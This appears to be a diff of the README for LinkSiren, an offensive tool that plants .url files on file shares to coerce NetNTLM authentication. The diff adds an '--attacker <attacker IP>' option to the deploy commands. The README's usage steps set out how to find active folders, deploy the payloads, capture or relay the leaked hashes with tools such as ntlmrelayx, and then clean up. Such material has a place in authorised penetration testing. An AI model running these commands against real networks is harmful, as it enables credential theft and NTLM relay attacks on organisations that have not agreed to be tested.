@@ -10,7 +10,7 @@ LinkSiren distributes .url files to accessible file shares to coerce NetNTLM aut
 git clone https://github.com/gjhami/LinkSiren.git && cd LinkSiren
 python -m pip install -r requirements.txt
 python link_siren.py --username <username> --password <password> --domain <domain.tld> --targets <shares file> --identify
-python link_siren.py --username <username> --password <password> --domain <domain.tld> --targets folder_targets.txt --deploy
+python link_siren.py --username <username> --password <password> --domain <domain.tld> --targets folder_targets.txt --attacker <attacker IP> --deploy
 # Capture hashes
 python link_siren.py --username <username> --password <password> --domain <domain.tld> --targets payloads_written.txt --cleanup
 ```
@@ -35,7 +35,7 @@ python -m pip install -r requirements.txt
 python link_siren.py --username <username> --password <password> --domain <domain.tld> --targets <shares file> --identify
 # 3. Use LinkSiren to deploy payloads to all of the active folders
 #    --identify saves UNC paths to active folders in folder_targets.txt
-python link_siren.py --username <username> --password <password> --domain <domain.tld> --targets folder_targets.txt --deploy
+python link_siren.py --username <username> --password <password> --domain <domain.tld> --targets folder_targets.txt --attacker <attacker IP> --deploy
 # 4. Let the hashes come to you and relay them as you see fit :)
 #    Use CrackMapExec and LdapRelayScan for relay target identification
 #    Use Impacket's ntlmrelayx for relay or smbserver + pcredz for capture on the attacker machine
